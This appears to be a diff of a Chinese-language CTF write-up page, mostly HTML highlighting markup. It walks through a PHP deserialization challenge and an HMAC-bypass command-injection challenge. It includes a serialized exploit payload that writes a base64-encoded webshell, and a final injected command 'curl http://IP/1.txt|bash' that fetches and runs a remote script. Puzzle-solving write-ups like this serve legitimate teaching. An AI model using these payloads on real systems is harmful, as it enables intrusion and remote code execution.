28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:easyser" class="headings">EasySer</a></h2>
@@ -467,8 +467,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--  小胖说用个不安全的协议从我家才能进ser.php呢！  !--&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!--  小胖说用个不安全的协议从我家才能进ser.php呢！  !--&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>直接<code>http://127.0.0.1/ser.php</code>访问获得源码</p>
 <div class="highlight"><div class="chroma">
@@ -514,46 +514,46 @@
 </span><span class="lnt">39
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="k">if</span> <span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;127.0.0.1&#34;</span> <span class="p">)</span> <span class="p">{</span>
-    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="p">}</span> 
-<span class="nv">$flag</span><span class="o">=</span><span class="s1">&#39;{Trump_:&#34;fake_news!&#34;}&#39;</span><span class="p">;</span>
-
-<span class="k">class</span> <span class="nc">GWHT</span><span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$hero</span><span class="p">;</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hero</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Yasuo</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hero</span><span class="p">)){</span>
-            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hero</span><span class="o">-&gt;</span><span class="na">hasaki</span><span class="p">();</span>
-        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-            <span class="k">return</span> <span class="s2">&#34;You don&#39;t look very happy&#34;</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">class</span> <span class="nc">Yongen</span><span class="p">{</span> <span class="c1">//flag.php
-</span><span class="c1"></span>    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$text</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">hasaki</span><span class="p">(){</span>
-        <span class="nv">$d</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php die(&#34;nononon&#34;);?&gt;&#39;</span><span class="p">;</span>
-        <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span><span class="p">;</span>
-         <span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">class</span> <span class="nc">Yasuo</span><span class="p">{</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">hasaki</span><span class="p">(){</span>
-        <span class="k">return</span> <span class="s2">&#34;I&#39;m the best happy windy man&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;127.0.0.1&#34;</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span><span class="o">=</span><span class="s1">&#39;{Trump_:&#34;fake_news!&#34;}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">GWHT</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$hero</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hero</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Yasuo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hero</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hero</span><span class="o">-&gt;</span><span class="na">hasaki</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;You don&#39;t look very happy&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Yongen</span><span class="p">{</span> <span class="c1">//flag.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$text</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">hasaki</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$d</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php die(&#34;nononon&#34;);?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">         <span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Yasuo</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">hasaki</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;I&#39;m the best happy windy man&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>后面没思路了，参数传递点死活找不到。。。看了源码才知道star1.php还接收了一个参数c(怎么找到的啊，不会啊)，也是这个c赋值触发了<code>__toString</code>魔术方法。</p>
 <p>exp</p>
@@ -579,25 +579,25 @@
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">class</span> <span class="nc">GWHT</span><span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$hero</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="k">class</span> <span class="nc">Yongen</span><span class="p">{</span> <span class="c1">//flag.php
-</span><span class="c1"></span>    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$text</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;php://filter/write=convert.base64-decode/resource=aaa.php&#34;</span><span class="p">;</span>
-<span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;aaaPD9waHAgc3lzdGVtKCRfUE9TVFthXSk7&#34;</span><span class="p">;</span><span class="c1">// &lt;?php system($_POST[a]);
-</span><span class="c1"></span><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GWHT</span><span class="p">();</span>
-<span class="nv">$o</span><span class="o">-&gt;</span><span class="na">hero</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Yongen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
-<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">GWHT</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$hero</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Yongen</span><span class="p">{</span> <span class="c1">//flag.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$text</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;php://filter/write=convert.base64-decode/resource=aaa.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;aaaPD9waHAgc3lzdGVtKCRfUE9TVFthXSk7&#34;</span><span class="p">;</span><span class="c1">// &lt;?php system($_POST[a]);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GWHT</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">hero</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Yongen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>payload</p>
 <div class="highlight"><div class="chroma">
@@ -605,8 +605,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">path</span><span class="o">=</span><span class="nx">http</span><span class="o">://</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="nx">star1</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">c</span><span class="o">=</span><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;GWHT&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;hero&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;Yongen&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;file&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">57</span><span class="o">:</span><span class="s2">&#34;php://filter/write=convert.base64-decode/resource=aaa.php&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;text&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">35</span><span class="o">:</span><span class="s2">&#34;aaaPD9waHAgc3lzdGVtKCRfUE9TVFthXSk7&#34;</span><span class="p">;}}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">path</span><span class="o">=</span><span class="nx">http</span><span class="o">://</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="nx">star1</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">c</span><span class="o">=</span><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;GWHT&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;hero&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;Yongen&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;file&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">57</span><span class="o">:</span><span class="s2">&#34;php://filter/write=convert.base64-decode/resource=aaa.php&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;text&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">35</span><span class="o">:</span><span class="s2">&#34;aaaPD9waHAgc3lzdGVtKCRfUE9TVFthXSk7&#34;</span><span class="p">;}}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>添加的<strong>aaa</strong>是补全前面的死亡代码，使其凑够为8的倍数，否则base64解码时会破坏我们构造的shell。</p>
 <blockquote>
@@ -629,18 +629,18 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Black-Cat-Sheriff&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;One-ear&#39;</span><span class="p">])){</span>
-    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;谁！竟敢踩我一只耳的尾巴！&#39;</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="nv">$clandestine</span> <span class="o">=</span> <span class="nx">getenv</span><span class="p">(</span><span class="s2">&#34;clandestine&#34;</span><span class="p">);</span>
-<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;White-cat-monitor&#39;</span><span class="p">]))</span>
-    <span class="nv">$clandestine</span> <span class="o">=</span> <span class="nx">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;White-cat-monitor&#39;</span><span class="p">],</span> <span class="nv">$clandestine</span><span class="p">);</span>
-<span class="nv">$hh</span> <span class="o">=</span> <span class="nx">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;One-ear&#39;</span><span class="p">],</span> <span class="nv">$clandestine</span><span class="p">);</span>
-<span class="k">if</span><span class="p">(</span><span class="nv">$hh</span> <span class="o">!==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Black-Cat-Sheriff&#39;</span><span class="p">]){</span>
-    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#39;</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="k">echo</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;nc&#34;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;One-ear&#39;</span><span class="p">]);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Black-Cat-Sheriff&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;One-ear&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;谁！竟敢踩我一只耳的尾巴！&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$clandestine</span> <span class="o">=</span> <span class="nx">getenv</span><span class="p">(</span><span class="s2">&#34;clandestine&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;White-cat-monitor&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$clandestine</span> <span class="o">=</span> <span class="nx">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;White-cat-monitor&#39;</span><span class="p">],</span> <span class="nv">$clandestine</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hh</span> <span class="o">=</span> <span class="nx">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;One-ear&#39;</span><span class="p">],</span> <span class="nv">$clandestine</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$hh</span> <span class="o">!==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Black-Cat-Sheriff&#39;</span><span class="p">]){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;nc&#34;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;One-ear&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><a href="https://www.php.net/manual/zh/function.hash-hmac.php" target="_blank" rel="noopener">php参考手册</a>中提到参数为数组时返回NULL，此时$clandestine值即为NULL，那么$hh就可以算出来了。echo加exec，那也不用弹什么shell了，直接命令执行，回显只会显示最后一行，base64也无法完全显示出来，只能弹shell了。</p>
 <pre tabindex="0"><code>White-cat-monitor[]=ttt&amp;Black-Cat-Sheriff=hash值&amp;One-ear=;curl http://IP/1.txt|bash
